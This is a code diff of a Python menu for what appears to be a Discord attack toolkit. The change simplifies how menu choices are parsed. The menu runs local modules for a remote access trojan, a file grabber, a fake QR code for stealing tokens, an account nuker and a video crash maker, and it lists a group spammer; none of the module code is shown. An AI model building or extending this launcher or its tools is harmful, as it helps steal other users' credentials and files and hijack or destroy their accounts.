@@ -14,41 +14,41 @@ def main():
 \n                                                                   {y}[{w}14{y}]{w} AutoLogin                {y}[{w}20{y}]{w} Group Spammer          
 \t\t\t\t\t\t\t\t\t\t\t\t\t {y}[{b}>{y}]{w} Next Page""")
     global choice
-    choice = input(f"""{y}[{b}#{y}]{w} Choice: """)
-
-    if choice == '1' or choice == '01':
+    choice = input(f"""{y}[{b}#{y}]{w} Choice: """).lstrip("0") # lstrip so it cuts all the leading 0's
+    
+    if choice == '1':
         transition()
         selfbottitle()
         input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} This tool is under development, so it is not yet usable.")
         main()
-    elif choice == '2' or choice == '02':
+    elif choice == '2':
         transition()
         exec(open('util/2_Rat/rat.py').read())
-    elif choice == '3' or choice == '03':
+    elif choice == '3':
         transition()
         raidtitle()
         input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} This tool is under development, so it is not yet usable.")
         main()
-    elif choice == '4' or choice == '04':
+    elif choice == '4':
         transition()
         raidtitle()
         input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} This tool is under development, so it is not yet usable.")
         main()
-    elif choice == '5' or choice == '05':
+    elif choice == '5':
         transition()
         subprocess.call([r'util\\5_VidCrashMaker\\crashvideomaker.bat'])
-    elif choice == '6' or choice == '06':
+    elif choice == '6':
         transition()
         exec(open('util/6_FileGrab/filegrabber.py').read())
-    elif choice == '7' or choice == '07':
+    elif choice == '7':
         transition()
         imagegrabbertitle()
         input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} This tool is under development, so it is not yet usable.")
         main()
-    elif choice == '8' or choice == '08':
+    elif choice == '8':
         transition()
         exec(open('util/8_TokenFakeQr/fakeqr.py').read())
-    elif choice == '9'or choice == '09':
+    elif choice == '9':
         transition()
         exec(open('util/9_AccountNuker/accountnuker.py').read())
     elif choice == '10':
